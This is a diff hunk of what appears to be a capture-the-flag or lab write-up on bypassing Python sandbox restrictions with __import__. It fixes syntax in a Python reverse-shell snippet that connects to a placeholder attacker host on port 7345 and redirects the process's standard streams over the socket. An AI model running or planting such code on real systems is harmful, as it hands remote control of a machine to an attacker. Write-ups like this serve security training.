@@ -113,11 +113,11 @@ We can try to use **\_\_import\_\_** statement.
 Knowing this we can prepare our code, bypass restrictions and get reverse shell with following code:
 ```
 o = __import__('os')
-s =__import__('socket')
+s = __import__('socket')
 p = __import__('subprocess')
 
 k=s.socket(s.AF_INET,s.SOCK_STREAM)
-k.connect(("YOUR_HOST_IP_ADDRESS,7345))
+k.connect(("YOUR_HOST_IP_ADDRESS",7345))
 o.dup2(k.fileno(),0)
 o.dup2(k.fileno(),1)
 o.dup2(k.fileno(),2)
